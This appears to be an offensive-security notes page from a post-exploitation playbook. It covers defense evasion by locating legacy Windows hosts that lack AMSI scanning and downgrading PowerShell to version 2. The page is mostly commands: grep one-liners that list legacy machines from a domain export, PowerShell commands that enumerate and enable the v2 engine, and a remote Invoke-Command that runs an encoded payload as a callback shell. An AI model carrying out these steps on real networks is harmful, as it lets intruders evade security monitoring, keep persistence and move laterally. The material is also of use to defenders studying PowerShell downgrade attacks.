# Description

The best defense evasion which is the most efficient way is to find legacy operating systems to lay a low profile in the network traffic to establish persistence to maintain access. Especially these legacy systems do not contain up-to-date security solutions. The main benefit is it is not required to re-implement the implant. It is easier to laterally pivot the machines with little effort.

## 01 - Windows Systems Table List

| Operating System       | Installed PowerShell version | Supported PowerShell Version |
| ---------------------- | ---------------------------- | ---------------------------- |
| Windows 7              | 2.0                          | 2.0, 3.0, 4.0, 5.0, 5.1      |
| Windows Server 2008 R2 | 2.0 (*\*)                    | 2.0, 3.0, 4.0, 5.0, 5.1      |
| Windows 8              | 3.0                          | 2.0, 3.0                     |
| Windows Server 2012    | 3.0                          | 2.0, 3.0, 4.0                |
| Windows 8.1            | 4.0                          | 2.0, 4.0, 5.0, 5.1           |
| Windows Server 2012 R2 | 4.0                          | 2.0, 4.0, 5.0, 5.1           |
| Windows 10             | 5.1                          | 2.0                          |
| Windows Server 2016    | 5.1                          | 2.0                          |

## 02 - Lack of AMSI Scanner

### 2.1 - Windows Servers

- Windows Server 2003

```
$ grep 'Windows Server 2003' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2003-output.txt
```

- Windows Server 2008 R2

```
$ grep 'Windows Server 2008' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2008-output.txt
```

- Windows Server 2012

```
$ grep 'Windows Server 2012' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-servers-2012-output.txt
```

### 2.2 - Windows Workstations

- Windows XP

```
$ grep 'Windows XP' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-xp-output.txt
```

- Windows 7

```
$ grep 'Windows 7' domain-network.csv | grep -oP '^:"CN=.*?,' > windows-7-output.txt
```

## 03 - Downgrade Powershell

### 3.1 - Enumerate PowerShell Version 2

```
PS C:\> $PSVersionTable

PS C:\> Get-WindowsFeature PowerShell-V2

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { Get-WindowsFeature PowerShell-V2 }

PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { $PSVersionTable }
```

### 3.2 - Install PowerShell Version 2

> [!INFO] Elevated Privileges is Required
> You must run this as administrator to install PowerShell version 2.

```
PS C:\> Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2

PS C:\> Enable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
```

### 3.3 - Execute Callback Shell

```
PS C:\> Invoke-Command -ComputerName <IP> -ScriptBlock { powershell -version 2 -e <base64_payload> }
```

---
## References

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Windows/Active Directory/0xB - Domain Controller/DC/Manual/Living off the Land|Living off the Land: Domain Controller]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x00 - Enumeration and Discovery/Windows/Active Directory/0xC - Domain Computers/Offensive Tools/Scripts/PowerSploit|PowerSploit: Active Directory Networking]]